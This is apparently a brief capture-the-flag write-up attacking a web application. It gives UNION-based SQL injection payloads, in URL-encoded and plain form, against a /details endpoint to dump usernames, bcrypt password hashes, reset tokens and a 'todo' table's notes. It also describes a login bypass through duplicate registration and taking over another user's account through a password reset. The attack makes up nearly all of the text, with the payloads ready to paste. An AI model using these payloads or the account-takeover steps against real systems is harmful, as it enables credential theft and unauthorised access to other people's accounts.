# register email a@a
# then try to register it again which will set session.uniqueId allowing for access to /dashboard
# sqli payload on /details:

```sql
0%20UNION%20select%20*%20from%20(select%20name%20from%20users)%20AS%20a%20JOIN%20(select%20password%20from%20users)%20as%20b%20JOIN%20(select%20null)%20as%20c%20JOIN%20(select%20null)%20as%20d%20JOIN%20(select%20null)%20as%20e%20JOIN%20(select%20null)%20as%20f%20JOIN%20(select%20null)%20as%20g%23
```

```sql
0 UNION select * from (select name from users) AS a JOIN (select password from users) as b JOIN (select null) as c JOIN (select null) as d JOIN (select null) as e JOIN (select null) as f JOIN (select null) as g#
```

# Passing the hashes (138 bcrypt2 hashes) doesn't give us any hits. So instead I reran my query with select token from users to see if there were any reset tokens available. Lots of admins but that looks to be all user generated which might not trigger on the wordlist so I looked for a user without any tokens (Wheatley) and requested a password reset on their account, re-ran the sqli, and retrieved and recovered/reset the password for that user. Once I was the user I had access to user management where I can do...other stuff? => total red-herring

# Instead enumerate the tables in the database and find table: todo with column name 'note'
# dump the notes with:
```sql
0,0%20UNION%20select%20*%20from%20(select%20id%20from%20todo)%20AS%20a%20JOIN%20(select%20null)%20as%20b%20JOIN%20(select%20note%20from%20todo)%20as%20c%20JOIN%20(select%20note%20from%20todo)%20as%20d%20JOIN%20(select%20null)%20as%20e%20JOIN%20(select%20null)%20as%20f%20JOIN%20(select%20null)%20as%20g%23
```
